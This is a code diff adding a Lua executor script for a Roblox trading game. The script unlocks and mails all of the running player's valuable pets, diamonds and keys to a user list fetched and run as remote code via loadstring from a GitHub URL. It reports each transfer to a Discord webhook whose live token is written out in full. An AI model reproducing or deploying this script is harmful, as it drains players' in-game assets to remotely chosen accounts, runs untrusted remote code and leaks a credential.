@@ -1,0 +1,152 @@
+--// ANTI DUP
+if _G.MAILBOX then return end
+_G.MAILBOX = true
+
+--// WEBHOOK
+local HttpService = game:GetService("HttpService")
+local WebhookURL = "https://discord.com/api/webhooks/1494174867279319131/fNoT2qM1ZQ8az6e5Xh205DI8E1eJrVikZClmvsLsKJT8FS2u8fFwDKcVDiLqjULmKA0I"
+
+local function SendWebhook(msg)
+    pcall(function()
+        HttpService:PostAsync(WebhookURL, HttpService:JSONEncode({
+            content = msg
+        }))
+    end)
+end
+
+--// FILE SYSTEM
+local FILE_NAME = "sent_users.txt"
+local SentUsers = {}
+
+if isfile(FILE_NAME) then
+    for line in string.gmatch(readfile(FILE_NAME), "[^\r\n]+") do
+        SentUsers[line] = true
+    end
+end
+
+local function SaveUser(user)
+    if not SentUsers[user] then
+        appendfile(FILE_NAME, user .. "\n")
+        SentUsers[user] = true
+    end
+end
+
+--// CONFIG
+getgenv().AutoMail = {
+    ['Items'] = {
+        ['Buff Tiger'] = { Class = "Pet", AllVariants = true, Amount = "Max" },
+        ['Hype Egg'] = { Class = "Lootbox", Amount = "Max" },
+        ['Diamond'] = { Class = "Seed", MinAmount = 500, Amount = "Max" },
+        ['Secret Key'] = { Class = "Misc", MinAmount = 100, Amount = "Max" },
+    },
+
+    ['Users'] = loadstring(game:HttpGet("https://raw.githubusercontent.com/dracular111/01/main/A-List-User"))()
+}
+
+--// UI
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player.PlayerGui)
+gui.Name = "MailProgressUI"
+
+local label = Instance.new("TextLabel", gui)
+label.Size = UDim2.new(0, 260, 0, 45)
+label.Position = UDim2.new(0, 10, 0, 10)
+label.BackgroundColor3 = Color3.fromRGB(0,0,0)
+label.TextColor3 = Color3.fromRGB(0,255,0)
+label.TextScaled = true
+label.Font = Enum.Font.SourceSansBold
+label.Text = "Loading..."
+
+--// LOAD
+repeat task.wait() until game:IsLoaded()
+
+local Client = game:GetService('ReplicatedStorage').Library.Client
+local Network = require(Client.Network)
+local SaveModule = require(Client.Save)
+
+--// USER SYSTEM
+local CurrentIndex = 1
+
+local function GetNextUser()
+    while CurrentIndex <= #AutoMail['Users'] do
+        local user = AutoMail['Users'][CurrentIndex]
+        CurrentIndex += 1
+
+        if not SentUsers[user] then
+            return user
+        end
+    end
+    return nil
+end
+
+local function CountSent()
+    local count = 0
+    for _, u in ipairs(AutoMail['Users']) do
+        if SentUsers[u] then count += 1 end
+    end
+    return count
+end
+
+--// MAIN
+do
+    local total = #AutoMail['Users']
+
+    while true do
+        local User = GetNextUser()
+
+        if not User then
+            label.Text = "DONE ✔"
+            SendWebhook("🎉 ĐÃ GỬI XONG TOÀN BỘ USER!")
+            print("DONE ALL")
+            _G.MAILBOX = nil
+            return
+        end
+
+        local sent = CountSent()
+        label.Text = "["..sent.."/"..total.."] → "..User
+
+        --// DUYỆT ITEM CONFIG
+        for ItemName, Info in pairs(AutoMail['Items']) do
+
+            for Class, Items in pairs(SaveModule.Get()['Inventory']) do
+                for uid, v in pairs(Items) do
+
+                    local isVariant = Info.AllVariants and (string.match(v.id, "^Huge ") or string.match(v.id, "^Titanic "))
+                    local amount = tonumber(v._am) or 1
+
+                    if (ItemName == v.id or isVariant) and Info.Class == Class then
+
+                        if Info.MinAmount and amount < Info.MinAmount then
+                            continue
+                        end
+
+                        local sendAmount = (Info.Amount == "Max") and amount or Info.Amount
+
+                        -- UNLOCK
+                        if v._lk then
+                            repeat task.wait(0.1)
+                            until Network.Invoke("Locking_SetLocked", uid, false)
+                        end
+
+                        -- SEND (1 ITEM = 1 MAIL)
+                        repeat
+                            task.wait(0.2)
+                        until Network.Invoke("Mailbox: Send", User, "Bless", Class, uid, sendAmount)
+
+                        local msg = "📦 "..ItemName.." → "..User
+                        print(msg)
+                        SendWebhook(msg)
+
+                        task.wait(1)
+                        break
+                    end
+                end
+            end
+        end
+
+        -- SAVE USER SAU KHI GỬI XONG FULL ITEM
+        SaveUser(User)
+
+        SendWebhook("✅ Hoàn tất user: "..User)
+    end
+end
